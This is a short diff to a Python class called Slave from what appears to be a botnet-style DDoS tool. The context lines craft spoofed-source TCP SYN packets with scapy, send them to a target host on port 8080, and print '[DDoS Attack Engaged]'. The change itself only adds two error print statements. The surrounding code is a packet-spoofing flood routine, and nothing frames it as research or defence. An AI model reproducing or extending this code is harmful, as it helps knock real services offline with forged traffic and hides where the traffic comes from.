@@ -53,6 +53,8 @@ class Slave():
             spoofed_SYN =scapy.IP(dst=host,src=src)/scapy.TCP(dport=8080,sport=5000,flags='S')
             scapy.send(spoofed_SYN)
         except error, msg:
+            print error
+            print msg
             self.num_connections = self.num_connections+1
             print("|[Connection Failed] | %d", self.num_connections )
         print ("|[DDoS Attack Engaged] |")
